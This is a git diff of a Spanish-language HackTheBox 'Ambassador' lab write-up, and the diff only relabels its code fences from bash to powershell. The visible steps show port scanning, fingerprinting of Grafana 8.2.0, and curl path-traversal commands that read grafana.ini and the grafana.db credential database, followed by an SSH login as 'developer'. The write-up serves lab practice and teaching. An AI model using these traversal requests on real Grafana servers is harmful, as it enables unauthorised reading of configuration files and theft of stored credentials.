@@ -6,14 +6,14 @@ heroImage: 'https://res.cloudinary.com/djc1umong/image/upload/v1686606312/Ambass
 slug: 'box/ambassador'
 ---
 
-```bash
+```powershell
 $ rustscan -a 10.10.11.183 -g -- -A -sS -n
 10.10.11.183 -> [22,80,3000,3306]
 ```
 
 reporta cuatro puertos abiertos, toca ver los servicios:
 
-```bash
+```powershell
 
 $ rustscan -a 10.10.11.183  -- -A -sCV -n
 22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
@@ -90,7 +90,7 @@ probamos en el panel de login, puerto <i>3000</i> SQLI, Path Traversal, XXE, etc
 
 Probamos buscando con searchsploit a grafana.
 
-```bash
+```powershell
 $ searchsploit grafana
   Exploit Title                                                                                                                                                |  Path
 Grafana 7.0.1 - Denial of Service (PoC)                                                                                                                       | linux/dos/48638.sh
@@ -100,7 +100,7 @@ Shellcodes: No Result
 
 vemos la versión que corre con whatweb y si es vulnerable.
 
-```bash
+```powershell
 $ whatweb http://10.10.11.183:3000
 http://10.10.11.183:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.10.11.183], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
 http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], HTML5, IP[10.10.11.183], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
@@ -108,7 +108,7 @@ http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], H
 
 nos traemos el script y le echamos un ojo
 
-```bash
+```powershell
 
 $ cat /usr/share/exploitdb/exploits/multiple/webapps/50581.py > 50581.py
 
@@ -116,7 +116,7 @@ $ cat /usr/share/exploitdb/exploits/multiple/webapps/50581.py > 50581.py
 
 en la linea 71 vemos algo interesante
 
-```bash
+```powershell
 url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
 ```
 
@@ -132,13 +132,13 @@ If you installed Grafana using the deb or rpm packages, then your configuration 
 
 En este caso haremos un <i>curl</i> desde la terminal con toda la información recolectada, la variable <i>choice(plugin_list) </i> cogemos por ejemplo la primera variable o la variable table.
 
-```bash
+```powershell
 $ curl --path-as-is http://10.10.11.183:3000/public/plugins/table/../../../../../../../../../../../../../etc/grafana/grafana.ini -o hijack
 ```
 
 con el comando <i>cat</i> inspeccionamos el archivo <i>hijack</i>. En la línea 220 encontramos:
 
-```bash
+```powershell
 220: admin_password = **************
 ```
 
@@ -154,7 +154,7 @@ Download this file to your local machine or any machine which you want. Please d
 
 y así hacemos un segundo <i>curl</i> al puerto <i>3000</i> donde recibe peticiones la base de datos <i>grafana</i>.
 
-```bash
+```powershell
 curl --path-as-is http://10.10.11.183:3000/public/plugins/table/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db.db
 ```
 
@@ -162,7 +162,7 @@ Abrimos con <i>sqlitebrowser</i>, y
 nos traemos la contraseña del usuario developer
 que en la página principal nos decían que había un usuario con ese nombre y que se puede conectar por ssh.
 
-```bash
+```powershell
 
 $ ssh developer@10.10.11.183
 
